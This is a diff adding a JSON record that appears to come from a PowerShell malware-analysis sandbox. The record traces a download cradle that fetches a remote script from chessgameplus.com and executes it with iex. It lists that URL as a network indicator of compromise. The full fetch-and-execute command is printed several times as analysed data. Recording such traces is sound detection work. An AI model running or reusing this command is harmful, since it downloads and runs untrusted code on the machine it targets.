@@ -1,0 +1,58 @@
+{
+  "Actions": [
+    {
+      "Id": 0, 
+      "Actor": "powershell.exe", 
+      "BehaviorProps": {
+        "script": [
+          "iex (new-object net.webclient).downloadstring('http://chessgameplus.com/up/ud')"
+        ]
+      }, 
+      "Behaviors": [
+        "script_exec"
+      ]
+    }, 
+    {
+      "Behaviors": [
+        "new_object"
+      ], 
+      "Actor": "Microsoft.PowerShell.Utility\\New-Object", 
+      "Line": "iex (new-object net.webclient).downloadstring('http://chessgameplus.com/up/ud')", 
+      "BehaviorProps": {
+        "object": [
+          "net.webclient"
+        ]
+      }, 
+      "Parameters": {
+        "TypeName": "net.webclient"
+      }, 
+      "ExtraInfo": "", 
+      "Id": 1
+    }, 
+    {
+      "Behaviors": [
+        "network"
+      ], 
+      "Actor": "System.Net.WebClient.DownloadString", 
+      "Line": "iex (new-object net.webclient).downloadstring('http://chessgameplus.com/up/ud')", 
+      "BehaviorProps": {
+        "uri": [
+          "http://chessgameplus.com/up/ud"
+        ]
+      }, 
+      "Parameters": {
+        "address": "http://chessgameplus.com/up/ud"
+      }, 
+      "ExtraInfo": "", 
+      "Id": 2
+    }
+  ], 
+  "PotentialIndicators": {
+    "file_system": [], 
+    "network": [
+      "http://chessgameplus.com/up/ud"
+    ]
+  }, 
+  "EnvironmentProbes": {}, 
+  "Artifacts": {}
+}
